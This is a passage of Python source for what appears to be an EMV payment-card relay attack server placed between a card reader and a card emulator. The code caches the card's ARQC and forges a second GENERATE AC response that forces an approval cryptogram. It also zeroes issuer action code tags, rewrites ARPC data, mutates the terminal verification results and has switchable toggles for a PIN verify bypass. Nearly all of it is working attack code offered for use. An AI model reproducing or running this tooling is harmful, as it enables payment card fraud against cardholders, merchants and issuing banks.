                mutated = True

        if mutated:
            # Rebuild TLV
            new_body = b""
            for tag, value in tags:
                if tag > 0xFF:
                    tag_bytes = struct.pack(">H", tag)
                else:
                    tag_bytes = bytes([tag])
                length = len(value)
                if length < 0x80:
                    length_bytes = bytes([length])
                elif length < 0x100:
                    length_bytes = bytes([0x81, length])
                else:
                    length_bytes = bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
                new_body += tag_bytes + length_bytes + value
            return new_body + sw
        return rapdu

    def _handle_second_gac_forge(self, capdu: bytes) -> None:

        cache = self.state.arqc_cache

        p1 = gac_p1(capdu)

        brand = self.state.brand

        forced_cid = CID_TC


        forged = forge_2nd_gac(cache, forced_cid=forced_cid, brand=brand)


        if forged is None:

            log.error(

                f"[ARPC-FORGE] Unknown template (cached={cache.template}); "

                f"cannot forge 2nd GAC. Failing closed with 6F00."

            )

            self._send_frame(self.emulator_addr, SID_RAPDU, SW_6F00)

            with self.lock:

                self.state.second_ae_pending = False

                self.state.second_ae_reason = "forge failed: unknown template"

            return


        with self.lock:

            self.state.arpc_forge_count += 1

            self.state.second_ae_pending = False

            self.state.second_ae_reason = f"forged and consumed (#{self.state.arpc_forge_count})"

            count = self.state.arpc_forge_count


        atc_str = cache.atc.hex() if cache.atc else "default"

        iad_source = "cached" if cache.iad else f"brand-default:{brand}"

        log.info(

            f"[ARPC-FORGE #{count}] 2nd GAC forged "

            f"(template=0x{cache.template:02X}, brand={brand}, "

            f"CID=0x{forced_cid:02X}, ATC={atc_str}, IAD={iad_source}, "

            f"P1_req={gac_p1_name(p1)}) -> EMULATOR"

        )

        _record_apdu("FORGE>EMU", "RAPDU", "GENERATE AC (2nd) FORGED", forged,

                     note=f"template=0x{cache.template:02X} brand={brand} CID=0x{forced_cid:02X}")

        self._send_frame(self.emulator_addr, SID_RAPDU, forged)
        

    def _handle_rapdu(self, payload: bytes, addr) -> bytes:
        """
        Mutate / observe inbound RAPDUs.
        Returns the (possibly modified) payload that will be forwarded to the emulator.
        """
        if len(payload) < 2:
            return payload

        sw = payload[-2:]
        body = payload[:-2]
        first = body[0] if body else 0x00

        # ------------------------------------------------------------------
        # 1) SELECT AID � capture brand for later forge / mutation decisions
        # ------------------------------------------------------------------
        if first in (0x6F, 0x70):
            aid = find_tlv(body, 0x4F)
            if aid is not None:
                brand = identify_brand_from_aid(aid)
                with self.lock:
                    self.state.selected_aid = aid
                    self.state.brand = brand
                log.info("[%s:%d] AID selected: %s -> brand=%s",
                         addr[0], addr[1], aid.hex().upper(), brand)

        # ------------------------------------------------------------------
        # 2) GPO � remember template
        # ------------------------------------------------------------------
        if first in (0x77, 0x80):
            with self.lock:
                self.state.gpo_template = first
            log.info("[%s:%d] GPO template cached: 0x%02X", addr[0], addr[1], first)

        # ------------------------------------------------------------------
        # 3) READ RECORD � mutate IAC tags
        # ------------------------------------------------------------------
        if first == 0x70:
            modified = self._mutate_read_record_response(payload)
            if modified != payload:
                log.info("[%s:%d] [IAC-MUTATE] IAC tags zeroed in READ RECORD response",
                         addr[0], addr[1])
                return modified

        # ------------------------------------------------------------------
        # 4) GENERATE AC � cache ARQC, arm 2nd GAC forge, or forge 2nd GAC
        # ------------------------------------------------------------------
        if first in (0x77, 0x80):
            cid_tag = b"\x9F\x27\x01"
            idx = body.find(cid_tag)
            if idx != -1 and idx + 3 < len(body):
                cid = body[idx + 3]

                # First GAC � ARQC from card, cache it, arm forge
                if cid == 0x80 and not self.state.second_ae_pending:
                    with self.lock:
                        self.state.arqc_cache = ArqcCache(
                            template=first,
                            cid=cid,
                            atc=find_tlv(body, 0x9F36),
                            ac=find_tlv(body, 0x9F26),
                            iad=find_tlv(body, 0x9F10),
                        )
                        self.state.gac_response_count = 1
                        self.state.second_ae_pending = True
                        self.state.second_ae_reason = "1st GAC ARQC cached"

                    atc_str = (self.state.arqc_cache.atc.hex()
                               if self.state.arqc_cache.atc else "??")
                    ac_str = (self.state.arqc_cache.ac.hex()
                              if self.state.arqc_cache.ac else "??")
                    log.info(
                        "[%s:%d] [ARQC-CACHED] template=0x%02X brand=%s "
                        "ATC=%s AC=%s -> 2nd GAC forge ARMED",
                        addr[0], addr[1], first, self.state.brand,
                        atc_str, ac_str,
                    )
                    return payload

                # Second GAC � forge TC if armed
                if self.state.second_ae_pending and cid == 0x80:
                    with self.lock:
                        self.state.gac_response_count += 1
                    forged = forge_2nd_gac(
                        self.state.arqc_cache,
                        forced_cid=CID_TC,
                        brand=self.state.brand,
                    )
                    log.info("[%s:%d] [2ND-GAC-FORGE] Emitting forged TC (CID=0x40)",
                             addr[0], addr[1])
                    return forged

        # ------------------------------------------------------------------
        # 5) EXTERNAL AUTH � ARPC rewrite + TVR mutation
        # ------------------------------------------------------------------
        if len(payload) >= 2 and payload[0] == 0x82 and payload[1] == 0x00:
            payload, _ = rewrite_arpc_in_capdu(payload)
            payload, _ = mutate_tvr_in_generate_ac(payload)
            log.info("[%s:%d] [EXTERNAL-AUTH] ARPC rewritten + TVR mutated",
                     addr[0], addr[1])
            return payload

        # ------------------------------------------------------------------
        # 6) Default � forward untouched
        # ------------------------------------------------------------------
        return payload


    def _handle_heartbeat(self, payload: bytes, addr: Tuple[str, int]) -> None:

        self._send_ack(addr)


    def _handle_ctrl(self, payload: bytes, addr: Tuple[str, int]) -> None:

        command = payload.decode("utf-8", errors="replace").strip().upper()

        log.info(f"CTRL from {addr}: {command}")


        if command == "CARD_PRESENT":

            self.state.card_present = True

            if self.emulator_addr:

                self._send_frame(self.emulator_addr, SID_CTRL, payload)

            return


        if command == "CARD_REMOVED":

            self.state.card_present = False

            if self.emulator_addr:

                self._send_frame(self.emulator_addr, SID_CTRL, payload)

            return


        if command == "SESSION_RESET":

            with self.lock:

                self.state.reset()

                if packet_router:

                    try:

                        packet_router.reset_session()

                    except Exception as e:

                        log.debug(f"packet_router.reset_session failed: {e}")

            log.info(f"Session reset - seq={self.state.seq}")

            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr

            if target:

                self._send_frame(target, SID_CTRL, payload)

            return


        if command == "STATUS":

            aid_hex = self.state.selected_aid.hex().upper() if self.state.selected_aid else None

            status = {

                "ready": (self.reader_addr is not None and self.emulator_addr is not None),

                "reader_registered": self.reader_addr is not None,

                "emulator_registered": self.emulator_addr is not None,

                "reader_card_present": self.state.card_present,

                "verify_bypass_enabled": self.state.verify_bypass_enabled,

                "verify_bypass_count": self.state.verify_bypass_count,

                "arpc_forge_enabled": self.state.arpc_forge_enabled,

                "arpc_forge_count": self.state.arpc_forge_count,

                "arpc_rewrite_enabled": self.state.arpc_rewrite_enabled,

                "arpc_rewrite_count": self.state.arpc_rewrite_count,

                "tvr_mutation_enabled": self.state.tvr_mutation_enabled,

                "tvr_mutation_count": self.state.tvr_mutation_count,

                "gpo_template": (f"0x{self.state.gpo_template:02X}"

                                 if self.state.gpo_template else None),

                "second_ae_pending": self.state.second_ae_pending,

                "second_ae_reason": self.state.second_ae_reason,

                "brand": self.state.brand,

                "selected_aid": aid_hex,

                "session_seq": self.state.seq,

                "protocol_loaded": _HAS_PROTOCOL,

                "packet_router_loaded": packet_router is not None,

            }

            self._send_frame(addr, SID_CTRL, json.dumps(status).encode())

            return


        if command == "DUMP_STATE":

            cache = self.state.arqc_cache

            state_dump = {

                "session_seq": self.state.seq,

                "brand": self.state.brand,

                "selected_aid": self.state.selected_aid.hex().upper() if self.state.selected_aid else None,

                "gpo_template": f"0x{self.state.gpo_template:02X}" if self.state.gpo_template else None,

                "second_ae_pending": self.state.second_ae_pending,

                "second_ae_reason": self.state.second_ae_reason,

                "arqc_cache": {

                    "template": f"0x{cache.template:02X}" if cache.template else None,

                    "cid": f"0x{cache.cid:02X}" if cache.cid is not None else None,

                    "cid_name": CID_NAME_MAP.get(cache.cid, "?") if cache.cid is not None else None,

                    "atc": cache.atc.hex().upper() if cache.atc else None,

                    "ac": cache.ac.hex().upper() if cache.ac else None,

                    "iad": cache.iad.hex().upper() if cache.iad else None,

                    "parse_notes": cache.parse_notes,

                    "is_complete": cache.is_complete(),

                },

                "counters": {

                    "verify_bypass": self.state.verify_bypass_count,

                    "arpc_forge": self.state.arpc_forge_count,

                    "arpc_rewrite": self.state.arpc_rewrite_count,

                    "tvr_mutation": self.state.tvr_mutation_count,

                },

                "toggles": {

                    "verify_bypass_enabled": self.state.verify_bypass_enabled,

                    "arpc_forge_enabled": self.state.arpc_forge_enabled,

                    "arpc_rewrite_enabled": self.state.arpc_rewrite_enabled,

                    "tvr_mutation_enabled": self.state.tvr_mutation_enabled,

                },

                "pending_capdu": (self.state.pending_capdu.hex().upper()

                                  if self.state.pending_capdu else None),

            }

            self._send_frame(addr, SID_CTRL, json.dumps(state_dump, indent=2).encode())

            return


        if command == "DUMP_LAST":

            with _apdu_history_lock:

                dump = list(_apdu_history)[-20:]

            self._send_frame(addr, SID_CTRL, json.dumps(dump, default=str).encode())

            return


        if command.startswith("DUMP_LAST "):

            try:

                n = int(command.split()[1])

                n = max(1, min(n, APDU_HISTORY_SIZE))

            except (ValueError, IndexError):

                n = 20

            with _apdu_history_lock:

                dump = list(_apdu_history)[-n:]

            self._send_frame(addr, SID_CTRL, json.dumps(dump, default=str).encode())

            return


        if command == "VERIFY_BYPASS ON":

            self.state.verify_bypass_enabled = True

            log.info("VERIFY bypass ENABLED via CTRL")

            self._send_ctrl_response(addr, "OK VERIFY_BYPASS=ON")

            return


        if command == "VERIFY_BYPASS OFF":

            self.state.verify_bypass_enabled = False

            log.info("VERIFY bypass DISABLED via CTRL")

            self._send_ctrl_response(addr, "OK VERIFY_BYPASS=OFF")

            return


        if command == "ARPC_FORGE ON":

            self.state.arpc_forge_enabled = True

            log.info("ARPC forge ENABLED via CTRL")

            self._send_ctrl_response(addr, "OK ARPC_FORGE=ON")

            return


        if command == "ARPC_FORGE OFF":

            self.state.arpc_forge_enabled = False

            log.info("ARPC forge DISABLED via CTRL")

            self._send_ctrl_response(addr, "OK ARPC_FORGE=OFF")

            return


        if command == "ARPC_REWRITE ON":

            self.state.arpc_rewrite_enabled = True

            log.info("ARPC rewrite ENABLED via CTRL")

            self._send_ctrl_response(addr, "OK ARPC_REWRITE=ON")

            return


        if command == "ARPC_REWRITE OFF":

            self.state.arpc_rewrite_enabled = False

            log.info("ARPC rewrite DISABLED via CTRL")

            self._send_ctrl_response(addr, "OK ARPC_REWRITE=OFF")

            return


        if command == "TVR_MUTATE ON":

            self.state.tvr_mutation_enabled = True

            log.info("TVR mutation ENABLED via CTRL")

            self._send_ctrl_response(addr, "OK TVR_MUTATE=ON")

            return


        if command == "TVR_MUTATE OFF":

            self.state.tvr_mutation_enabled = False

            log.info("TVR mutation DISABLED via CTRL")

            self._send_ctrl_response(addr, "OK TVR_MUTATE=OFF")

            return


        if packet_router:

            parts = command.split(None, 1)

            if parts and parts[0] == "MODE" and len(parts) > 1:

                try:

                    packet_router.set_mode(parts[1])

                    self._send_ctrl_response(addr, f"OK MODE={packet_router.get_mode()}")

                except Exception as e:

                    self._send_ctrl_response(addr, f"ERR MODE: {e}")

                return


        target = self.emulator_addr if addr == self.reader_addr else self.reader_addr

        if target:

            self._send_frame(target, SID_CTRL, payload)




def main() -> None:

    import sys

    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5566

    server = RelayServer(port=port)

    try:

        server.start()

    except KeyboardInterrupt:

        server.stop()


if __name__ == "__main__":

    main()
